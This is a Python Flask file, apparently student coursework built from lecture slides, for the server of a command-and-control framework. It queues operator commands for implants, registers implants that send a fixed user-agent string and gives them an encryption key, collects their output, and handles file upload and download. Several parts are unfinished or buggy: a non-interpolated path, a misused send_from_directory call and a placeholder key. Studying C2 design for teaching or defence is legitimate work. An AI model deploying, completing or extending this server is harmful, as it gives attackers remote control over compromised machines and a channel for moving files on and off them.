"""IDK whata this does yet"""
# from lecture slides, refrenced 0xRick c2 code

# import sqlite3
import os
import multiprocessing as mp
import uuid
from flask import request, jsonify, flash, redirect
# import threading
# from app.models.agent import agents
# from multiprocessing import Process
# import requests
from werkzeug.utils import secure_filename
from app.app import createFlaskApp


# 控制端表

C2_SERVER = "http://0.0.0.0:8080"
lock = mp.Lock()
implant_lock = mp.Lock()
TASKS = []
AGENTS = []

createflask = createFlaskApp()
app = createflask.create_app()
ENCRYPTION_KEY = None


@app.route("/upload/<filename>", methods=["POST"])
def upload_files(filename):
    """Allows files to be uploaded"""
    # from flask documentation
    if request.method == 'POST':
        path = "data/listeners/{__name__}/"
        if not os.path.exists(path):
            os.mkdir(path)
        app.config['UPLOAD_FOLDER'] = path
        print("make sure your file exists and is in the correct directory")
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)

        file = request.files['file']
        if file and file.filename != '':
            filename = secure_filename(file.filename)
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            print('successfully uploaded file')
            return ''
    return ''


@app.route('/downloads/<filename>', methods=["GET"])
def download_file(filename):
    """Download a file"""
    return request.send_from_directory(app.config["UPLOAD_FOLDER"], filename)


@app.route("/tasks", methods=["GET"])
def download_tasks():
    """Get the tasks"""
    global TASKS
    lock.acquire()
    try:
        batch = "\n".join(TASKS[:5])
        TASKS = TASKS[5:]
    finally:
        lock.release()
    return batch


@app.route("/response", methods=["POST"])
def print_response():
    """idk what this does"""
    print(request.data.decode())
    return ""


@app.route("/queue")
def print_queue():
    """Get the current tasks"""
    return jsonify(TASKS)


@app.route("/secret", methods=["POST"])
def add_request():
    """I am not sure waht this does"""
    req = request.json
    lock.acquire()
    try:
        for cmd in req:
            TASKS.append(cmd)
    finally:
        lock.release()
    print("Queued up ", req)
    return "True"


@app.route("/register", methods=['POST', 'GET'])
def add_agent():
    """Add a new agent?"""
    user_agent = str(request.user_agent).strip(" \r\n\t")  # thank you windows
    if user_agent == 'ny4n_ca1':
        implant_id = str(uuid.uuid4())
        fromimplant = request.get_json()
        # guid = fromimplant['guid']
        # hostname = fromimplant['hostname']
        # username = fromimplant['username']
        # environment_variables = fromimplant["enviroment_variables"]
        implant_ip = request.environ['REMOTE_ADDR']
        print(fromimplant, implant_ip, implant_id)
        encryption_key = get_encryption_key()
        # agent = agents(implant_id, guid, hostname, username, \
        #    implant_ip, encryptionkey)
        # addtodatabase(agent)
        return jsonify(encryption_key)
    return jsonify("you're not authorized >:(")


def get_encryption_key():
    """Hmmmm"""
    global ENCRYPTION_KEY
    if ENCRYPTION_KEY is None:
        ENCRYPTION_KEY = "blahblahblah"
    return ENCRYPTION_KEY
